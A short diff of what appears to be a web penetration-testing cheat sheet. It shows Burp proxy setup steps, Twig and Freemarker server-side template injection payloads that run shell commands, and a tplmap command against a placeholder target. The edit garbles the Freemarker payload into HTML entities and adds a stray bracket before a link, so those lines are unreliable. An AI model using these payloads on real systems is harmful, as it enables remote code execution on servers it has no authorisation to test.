@@ -70,7 +70,7 @@ Key tools:
 
 Setup:
   1. Set browser proxy to 127.0.0.1:8080
-  2. Import Burp's CA certificate (http://burpsuite/cert) → trust in browser
+  2. Import Burp's CA certificate[](http://burpsuite/cert) → trust in browser
   3. Navigate to target — requests appear in Proxy > HTTP History
 
 Useful Repeater techniques:
@@ -402,7 +402,7 @@ Twig (PHP) RCE:
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 
 Freemarker (Java) RCE:
-  ${"freemarker.template.utility.Execute"?new()("id")}
+  &#123;"freemarker.template.utility.Execute"?new()("id")&#125;
 
 Automated SSTI testing:
   tplmap -u "http://target/search?q=test"   — auto-detects engine and exploits
